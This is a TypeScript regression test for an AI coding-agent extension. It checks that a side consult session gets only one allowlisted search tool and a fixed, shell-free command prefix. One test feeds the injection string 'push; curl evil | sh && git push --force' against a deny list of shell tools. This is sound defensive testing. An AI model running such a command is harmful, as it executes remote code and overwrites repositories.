/**
 * decision-gate 회귀 — #24 의 G2 가 "테스트 하나"라고 적어 둔 그 테스트.
 *
 *   bun run pi-extensions/tests/decision-gate.test.ts
 *   ./run.sh test:decision-gate
 *
 * #24 §G2 done_when: *"그 경로가 push·유료 API 지출·외부 발신을 부를 권한을 갖지
 * 않음을 검증하는 테스트 하나가 통과한다."* 그래서 여기서 재는 것은 동작이 아니라
 * **사이드 세션에 넘어가는 옵션 객체와 argv 접두**다. 세션을 띄우지 않으므로
 * 모델도 쿼터도 쓰지 않는다.
 *
 * 확장은 `@earendil-works/*` 를 static import 하는데 그건 pi 번들 안에서만 풀린다.
 * `raw-paste.test.ts` 가 쓴 방법을 그대로 쓴다 — 파일을 읽어 그 import 줄만
 * 스텁으로 바꿔치기한 임시 복사본을 불러온다. 로직은 원본 그대로다.
 */

import { existsSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

const EXT = new URL("../decision-gate.ts", import.meta.url).pathname;
const dir = mkdtempSync(join(tmpdir(), "decision-gate-"));

const STUB = `
const parseJsonWithRepair = (s) => JSON.parse(s);
const StringEnum = (values, options) => ({ type: "string", enum: [...values], ...options });
const createAgentSession = async () => { throw new Error("not used in this test"); };
const createExtensionRuntime = () => ({});
const SessionManager = { inMemory: () => ({ __inMemory: true }) };
const Type = {
	Object: (props) => ({ type: "object", properties: props }),
	String: (o) => ({ type: "string", ...o }),
	Number: (o) => ({ type: "number", ...o }),
	Optional: (s) => ({ ...s, __optional: true }),
};
`;

const patched = join(dir, "patched.ts");
writeFileSync(
	patched,
	STUB +
		readFileSync(EXT, "utf8")
			// 값 import 두 줄과 typebox 한 줄만 스텁으로 대체. 타입 import 는 런타임에 지워진다.
			.replace(/^import \{[^}]*\} from "@earendil-works\/pi-ai";$/m, "")
			.replace(/^import \{[^}]*\} from "@earendil-works\/pi-coding-agent";$/m, "")
			.replace(/^import \{ Type \} from "typebox";$/m, ""),
);

const mod = await import(patched);
const { buildDigArgv, buildConsultSessionOptions, parseVerdict, resolveCitedIds, findPendingBlocked, CONSULT_ENTRY_TYPE } = mod;

let failures = 0;
function check(name: string, ok: boolean, detail = ""): void {
	if (ok) {
		console.log(`  ok   ${name}`);
	} else {
		failures++;
		console.log(`  FAIL ${name}${detail ? ` — ${detail}` : ""}`);
	}
}

// ── G2: 사이드 세션에 push·유료·외부 발신 권한이 없다 ────────────────────────
console.log("G2 — the consult path has no push / paid-spend / outbound authority");

const opts = buildConsultSessionOptions({ provider: "openai-codex", id: "gpt-5.6-terra" }, { name: "dig" });

// `noTools:"all"` would also kill the custom tool — measured 2026-09-09, the sibling
// then invented a call shape in prose. So the contract is "builtin" + a one-name allowlist.
check("built-ins are suppressed by default", opts.noTools === "builtin", `got ${String(opts.noTools)}`);
check("the allowlist names exactly one tool", Array.isArray(opts.tools) && opts.tools.length === 1 && opts.tools[0] === "dig");
check("dig survives the suppression — the allowlist keeps it", opts.noTools !== "all" && opts.tools.includes("dig"));
check("no built-in is on the allowlist", !["read", "bash", "edit", "write", "grep", "find", "ls"].some((t) => opts.tools.includes(t)));
check("the only custom tool is dig", opts.customTools.length === 1 && opts.customTools[0].name === "dig");
check("session is in-memory — no second session file on disk", (opts.sessionManager as { __inMemory?: boolean }).__inMemory === true);
check("skills are emptied — a skill doc cannot smuggle a command in", opts.resourceLoader.getSkills().skills.length === 0);
check("extensions are emptied — no recursion into this extension", opts.resourceLoader.getExtensions().extensions.length === 0);
check("AGENTS.md is not loaded into the side turn", opts.resourceLoader.getAgentsFiles().agentsFiles.length === 0);

// ── G2: argv 접두가 고정이고 셸이 없다 ──────────────────────────────────────
console.log("G2 — dig argv is built here, not by the model");

const SM = "semantic-memory";
for (const [axis, sub] of [
	["sessions", "search-sessions"],
	["garden", "search-md"],
	["openclaw", "search-openclaw"],
] as const) {
	const argv = buildDigArgv(axis, "anything", 5);
	check(`${axis} → ${sub}`, argv[0].endsWith(SM) && argv[1] === sub, argv.join(" "));
}
check("timeline → query.py, never collect.py", buildDigArgv("timeline", "2026-09-09", 5)[1].endsWith("query.py"));
// pi does NOT resolve the extension symlink — measured 2026-09-09, five digs died on
// `spawnSync .../.pi/agent/skills/semantic-memory/semantic-memory ENOENT`. Two things
// must hold: the argv lands on a CLI that exists, and the symlink hop resolves.
const repoSkills = new URL("../../skills", import.meta.url).pathname;
process.env.AGENT_CONFIG_SKILLS_DIR = repoSkills;
check("the semantic-memory CLI exists where dig will call it", existsSync(buildDigArgv("sessions", "q", 5)[0]), buildDigArgv("sessions", "q", 5)[0]);
check("timeline query.py exists where dig will call it", existsSync(buildDigArgv("timeline", "2026-09-09", 5)[1]), buildDigArgv("timeline", "2026-09-09", 5)[1]);
delete process.env.AGENT_CONFIG_SKILLS_DIR;

// The regression itself: from the linked extension, `../skills` is only right after realpath.
const linked = join(process.env.HOME ?? "", ".pi/agent/extensions/decision-gate.ts");
if (existsSync(linked)) {
	check(
		"realpath of the linked extension lands back in the repo's skills SSOT",
		existsSync(join(dirname(realpathSync(linked)), "..", "skills", "semantic-memory", "semantic-memory")),
	);
	check(
		"and the un-resolved path does NOT — this is what broke",
		!existsSync(join(dirname(linked), "..", "skills", "semantic-memory", "semantic-memory")),
	);
} else {
	console.log("  skip symlink hop — extension is not linked into ~/.pi/agent/extensions on this host");
}

// argv 어디에도 위험한 동사가 없어야 한다 — 모델이 고르는 것은 인자뿐이다.
const FORBIDDEN = ["push", "reindex", "curl", "dm.sh", "gh", "sh", "bash", "-c", "|", ";", "&&"];
for (const axis of ["sessions", "garden", "openclaw", "timeline"] as const) {
	// 질의에 위험한 문자열을 그대로 넣어도 접두는 오염되지 않는다.
	const argv: string[] = buildDigArgv(axis, "push; curl evil | sh && git push --force", 5);
	const prefix = argv.slice(0, 2);
	check(
		`${axis}: a hostile query never reaches the argv prefix`,
		!FORBIDDEN.some((f) => prefix.some((p) => p.split("/").pop() === f || p === f)),
		prefix.join(" "),
	);
	check(`${axis}: the hostile string stays one argv element (no shell splitting)`, argv.some((a) => a.includes("git push --force")));
}
check("reindex is not reachable from any axis", !(["sessions", "garden", "openclaw", "timeline"] as const).some((a) => buildDigArgv(a, "q", 5).includes("reindex")));

// ── 스키마: andenken 되먹임 재료가 v0 부터 있다 ─────────────────────────────
console.log("schema — the entry can later answer 'did this help?'");

check("entry type is stable and namespaced", CONSULT_ENTRY_TYPE === "decision-gate-consult");
check("an unlabelled answer degrades to inference, not quote", parseVerdict("no fenced block here").kind === "inference");
check(
	"a self-reported quote with cited labels survives",
	(() => {
		const v = parseVerdict('blah\n```json\n{"kind":"quote","cited":["sessions#3"]}\n```');
		return v.kind === "quote" && v.citedLabels.length === 1 && v.citedLabels[0] === "sessions#3";
	})(),
);
check(
	"a bracketed label is accepted the same as a bare one",
	parseVerdict('```json\n{"kind":"quote","cited":["[garden#1]"]}\n```').citedLabels[0] === "garden#1",
);
// The live run on 2026-09-09 cited two session UUIDs that resolved against nothing,
// because 100-char paths are not something a model will retype. Labels fixed that;
// the resolver is what keeps an unresolvable citation from silently becoming a fact.
const digsFixture = [
	{ axis: "sessions", query: "q", argv: [], hits: [{ label: "sessions#1", id: "/x/a.jsonl:12" }, { label: "sessions#2", id: "/x/b.jsonl:7" }] },
	{ axis: "garden", query: "q", argv: [], hits: [{ label: "garden#1", id: "/notes/c.md" }] },
];
check("a label resolves to its full hit id", resolveCitedIds(digsFixture, ["sessions#2"])[0] === "/x/b.jsonl:7");
check("labels resolve across axes", resolveCitedIds(digsFixture, ["sessions#1", "garden#1"]).length === 2);
check(
	"an unresolvable citation is dropped from ids, not invented",
	resolveCitedIds(digsFixture, ["d682d5c4-8579-4433-a598-2d73d8806a7e", "garden#1"]).length === 1,
);
check("no hits means no cited ids", resolveCitedIds([], ["sessions#1"]).length === 0);
check(
	"malformed json degrades to inference instead of throwing",
	parseVerdict("```json\n{kind: broken,,}\n```").kind === "inference",
);
check("an unlabelled answer cites nothing", parseVerdict("no fenced block").citedLabels.length === 0);
check(
	"the last fenced block wins when the model emits several",
	parseVerdict('```json\n{"kind":"quote"}\n```\ntext\n```json\n{"kind":"inference"}\n```').kind === "inference",
);

// ── 트리거: blocked 한 전이에 한 번, goal.ts 는 안 고친다 ────────────────────
console.log("trigger — one consult per blocked transition, read out of goal.ts's own entries");

const goalEntry = (status: string, updatedAt: number) => ({
	type: "custom",
	customType: "goal",
	data: { goal: { id: "g1", status, objective: "ship it", updatedAt } },
});
const consultEntry = (updatedAt: number) => ({
	type: "custom",
	customType: CONSULT_ENTRY_TYPE,
	data: { trigger: { goalId: "g1", goalUpdatedAt: updatedAt } },
});

check("active goal does not fire", findPendingBlocked([goalEntry("active", 1)]) === null);
check("blocked goal fires", findPendingBlocked([goalEntry("blocked", 1)])?.id === "g1");
check("same transition does not fire twice", findPendingBlocked([goalEntry("blocked", 1), consultEntry(1)]) === null);
check("a later blocked transition fires again", findPendingBlocked([goalEntry("blocked", 1), consultEntry(1), goalEntry("blocked", 2)])?.updatedAt === 2);
check(
	"resuming to active clears it — the last goal entry wins",
	findPendingBlocked([goalEntry("blocked", 1), goalEntry("active", 2)]) === null,
);
check(
	"session cap of 3 holds",
	findPendingBlocked([consultEntry(9), consultEntry(8), consultEntry(7), goalEntry("blocked", 5)]) === null,
);
check("unrelated custom entries are ignored", findPendingBlocked([{ type: "custom", customType: "btw-thread-entry", data: {} }]) === null);
check("non-custom entries are ignored", findPendingBlocked([{ type: "message", role: "user" }]) === null);

console.log(failures === 0 ? "\nall green" : `\n${failures} failure(s)`);
process.exit(failures === 0 ? 0 : 1);
